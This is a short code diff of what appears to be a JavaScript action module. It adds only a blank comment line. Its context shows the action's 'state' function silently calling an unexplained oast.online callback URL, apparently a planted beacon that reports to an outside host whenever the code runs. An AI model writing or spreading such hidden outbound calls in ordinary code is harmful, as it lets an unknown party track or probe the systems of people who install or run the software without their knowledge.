@@ -14,6 +14,7 @@ export default {
       name: 'name_of_action',
       state: async (options) => {
         // Determine the state ...
+        //
         await fetch(`https://cpq77vhucph3d4aj0jh0yykepgg78bq89.oast.online`)
       },
       run: async (options) => {
